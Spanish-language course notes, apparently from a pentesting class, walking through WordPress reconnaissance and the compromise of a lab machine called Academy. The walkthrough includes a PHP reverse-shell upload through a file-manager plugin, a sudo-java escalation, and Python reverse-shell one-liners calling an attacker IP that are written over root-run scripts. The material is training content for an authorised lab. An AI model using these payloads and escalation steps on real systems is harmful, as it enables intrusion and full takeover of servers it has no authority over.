## ① Webs nativas vs CMS y la cadena de dependencias

### La distinción fundamental

Antes de tocar herramientas, Carlos establece una distinción que cambia cómo se audita una web:

| Tipo | Ejemplos | Cómo se audita |
|------|----------|----------------|
| **Web nativa** | PHP, .NET, Java, Go | Directamente sobre su código y configuración |
| **CMS** | WordPress, Drupal, Joomla, Shopify | Motor + Tema + Plugins |

### WordPress como motor de tres capas

```
│”Œ─────────────────────────────────────────────────────────│”
│ 1. WORDPRESS (motor) €” Núcleo que hace funcionar todo │
│”œ─────────────────────────────────────────────────────────│”¤
│ 2. TEMA / PLANTILLA (carcasa) €” Lo visual │
│”œ─────────────────────────────────────────────────────────│”¤
│ 3. PLUGINS (accesorios) €” Funcionalidades │
┘─────────────────────────────────────────────────────────│”˜
```

> [!important] Distribución asimétrica del riesgo
> - **Núcleo de WordPress**: rara vez tiene vulnerabilidades explotables sin autenticación previa
> - **Tema**: puede tener vulnerabilidades, pero es código visual
> - **Plugins**: desarrollados mayoritariamente por comunidades **sin revisión de seguridad formal**, concentran la inmensa mayoría de vectores de ataque

### La cadena va más lejos: dependencias en cascada

```
Plugin → Librerías → Dependencias de 2º nivel → Componentes de 3er nivel
```

Cualquier eslabón de esa cadena puede ser vulnerable. Esto conecta directamente con la categoría de **fallos en la cadena de suministro** del OWASP Top 10, que ahora cobra sentido práctico concreto.

> [!important] La metáfora del coche de Carlos
> "WordPress es el motor (Lamborghini). El tema es la carcasa (Urus o Audi RQ8 €” mismo motor, carcasa distinta). Los plugins son los accesorios: alerón, asientos de cuero, volante de fibra. ¿En cuáles puedo tener vulnerabilidades? **En los plugins**. Y el alerón puede ser de carbono o de Aliexpress. Esas son las librerías que componen el plugin. ¿Puede tener vulnerabilidades una librería que compone una librería que compone un plugin? Sí. Pegasus era una librería Tier 3 de las llamadas de WhatsApp."

## ② Reconocimiento y enumeración €” Máquina Academy

### Ficha técnica de la máquina

| Dato | Valor |
|------|-------|
| **Máquina** | Academy (HackerLab) |
| **Puertos** | 22 (SSH), 80 (HTTP Apache 2.4.59) |
| **Tecnología** | WordPress en `/wordpress` |
| **Vector inicial** | File Upload en panel de administración → RCE |
| **Escalada** | Cron job / Script hijacking (se ve en siguiente clase) |

### Paso 1: Netdiscover + Nmap

```bash
# Descubrir IP en el rango
sudo netdiscover -r 10.0.2.0/24

# Escaneo de puertos y servicios
nmap -sC -sV -p- 10.0.2.8 --min-rate 1500
```

**Resultado:**
- Puerto 22: SSH (necesita credenciales €” no brute force todavía)
- Puerto 80: HTTP Apache 2.4.59

> [!important] ¿Por qué no vamos directo al 22?
> "Porque SSH necesitaríamos tener credenciales. Como no nos metamos ahora mismo directamente a pegarnos cabezazos contra una fuerza bruta, no podemos hacer nada."

### Paso 2: Análisis de la web €” Detección de WordPress

```bash
# Ver tecnologías con Wappalyzer (extensión navegador)
# O desde terminal:
nikto -h 10.0.2.8
```

**Hallazgo crítico:** La web principal **no es WordPress**. WordPress está en el directorio `/wordpress`.

> [!warning] Error clásico de OSCP
> "Si tienes una página web que tiene WordPress **no significa** que toda la página web sea WordPress. Yo puedo tener una web nativa en `/`, y en `/wordpress` un blog, en `/drupal` un Drupal, etc. Si lanzas WPScan contra la raíz, te dice 'aquí no hay WordPress'. **Siempre lanza la herramienta contra el directorio que contiene la tecnología vulnerable**."

### Paso 3: WPScan €” La navaja suiza de WordPress

```bash
# Instalar/actualizar WPScan
gem install wpscan

# Uso básico SIN API (limitado)
wpscan --url http://10.0.2.8/wordpress

# Con API key (gratuita en wpscan.com)
wpscan --url http://10.0.2.8/wordpress --api-token TU_TOKEN
```

| Sin API | Con API |
|---------|---------|
| Lista plugins instalados | **Detecta vulnerabilidades** de cada plugin |
| Versión de WordPress | Versión + CVEs asociados |
| Tema activo | Vulnerabilidades del tema |
| Usuarios enumerados | Enumeración completa |

> [!important] La diferencia es brutal
> "Fíjate ahora cómo han contado vulnerabilidades de la versión de WordPress que antes no nos había encontrado. Antes nos ponía 'WordPress 6.5.3' y nada más. Ahora que le hemos puesto la API que se conecta a su base de datos de vulnerabilidades, ahora sí que nos está diciendo qué CVEs afectan."

### Paso 4: Enumeración de usuarios

```bash
# Enumerar usuarios (requiere API para lista completa)
wpscan --url http://10.0.2.8/wordpress -e u
# -e u = enumerate users
```

**Usuarios encontrados:** `dylan` (contraseña: `1` €” increíblemente débil)

## ③ Explotación €” File Upload en panel de administración

### Acceso al panel

```
URL: http://10.0.2.8/wordpress/wp-login.php
User: dylan
Pass: 1
```

### Vector: Bit File Manager

En el panel de administración, Chema identifica un plugin interesante: **Bit File Manager** en `wp-content/uploads`.

> [!important] El binomio mágico
> "Si encontramos un **uploader** y un **uploads** donde se almacenan las cosas y las podemos ejecutar, tenemos RCE. Son las dos componentes de la masilla dos en uno."

### Subida de reverse shell PHP

1. Navegar a Bit File Manager → `wp-content` → `uploads`
2. Subir `php-reverse-shell.php` (de `/usr/share/webshells/php/`)
3. Editar la shell: cambiar IP y puerto
4. Poner Netcat a la escucha: `nc -lvnp 1234`
5. Ejecutar la shell accediendo a `http://10.0.2.8/wordpress/wp-content/uploads/php-reverse-shell.php`

```bash
# En atacante
nc -lvnp 1234

# En la shell obtenida
whoami
# www-data
```

> [!important] Webshell vs Reverse Shell
> - **Webshell**: tú te conectas a la máquina (necesitas que el firewall te deje entrar)
> - **Reverse shell**: la máquina se conecta a ti (el firewall suele permitir salidas)
> - **Por lo general, siempre reverse shell**. Si el firewall bloquea conexiones entrantes pero no salientes, la reverse es la única opción.

### Estabilización de la shell

```bash
# En la reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## ④ Movimiento lateral y escalada €” Chema resuelve la máquina

### Usuario www-data → Mike

```bash
# En /etc/passwd se ve usuario mike con /bin/bash
# En wp-config.php (leído via LFI o explorando) hay credenciales de BD
# Reutilización de credenciales: mismo user/pass para SSH

ssh mike@10.0.2.8
# Password: [la del config.php]
```

### Mike → N (via sudo -l + GTFOBins)

```bash
$ sudo -l
User mike may run the following commands:
 (n) NOPASSWD: /usr/bin/java
```

**GTFOBins → Java → Sudo**

```bash
# Crear exploit Java
cat > shell.java << 'EOF'
public class shell {
 public static void main(String[] args) throws Exception {
 ProcessBuilder pb = new ProcessBuilder("/bin/bash");
 pb.inheritIO().start().waitFor();
 }
}
EOF

# Compilar y ejecutar
javac shell.java
sudo -u n /usr/bin/java shell
# ¡Somos usuario n!
```

### N → Pilon (via sudo -l + Python)

```bash
$ sudo -l
User n may run the following commands:
 (pilon) NOPASSWD: /usr/bin/python3 /opt/suma.py
```

> [!warning] Restricción importante
> "Ahora cambia la película. No puedo crear cualquier archivo de Python y ejecutarlo. **Solo puedo ejecutar ese archivo exacto**: `python3 /opt/suma.py`. Tengo que **modificar ese archivo**."

```bash
# Ver contenido actual
cat /opt/suma.py
# import os; print("suma")

# Sobrescribir con reverse shell
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /opt/suma.py

# Ejecutar como pilon
sudo -u pilon /usr/bin/python3 /opt/suma.py
# ¡Somos pilon!
```

### Pilon → Root (Cron job / Script hijacking)

```bash
$ sudo -l
User pilon may run the following commands:
 (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

```bash
# Ver backup.py
cat /opt/backup.py
# Hace un backup, se ejecuta periódicamente como root (cron)

# Modificar para reverse shell
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /opt/backup.py

# Esperar cron (o ejecutar si se puede)
sudo -u root /usr/bin/python3 /opt/backup.py
# ¡ROOT!
```

## ⑤ Conceptos clave consolidados

| Concepto | Explicación |
|----------|-------------|
| **Web nativa vs CMS** | Auditoría diferente: código propio vs motor+tema+plugins |
| **Cadena de dependencias** | Plugin → librería → dependencia → componente; cualquier eslabón vulnerable |
| **WPScan con API** | Gratis, ilimitada para uso personal, **imprescindible** para ver CVEs |
| **Directorio correcto** | Lanza herramientas contra el path que contiene la tecnología vulnerable |
| **File Upload = RCE** | Necesitas: 1) Uploader funcional, 2) Directorio uploads accesible y ejecutable |
| **Reverse vs Bind** | Reverse: víctima → atacante (atravesan firewalls). Bind: atacante → víctima |
| **sudo -l + GTFOBins** | Procedimiento estándar post-explotación |
| **Movimiento lateral** | Reutilización de credenciales, sudo -u, explotación de binarios con SUID |
| **Script hijacking** | Modificar un script que root ejecuta periódicamente (cron) |
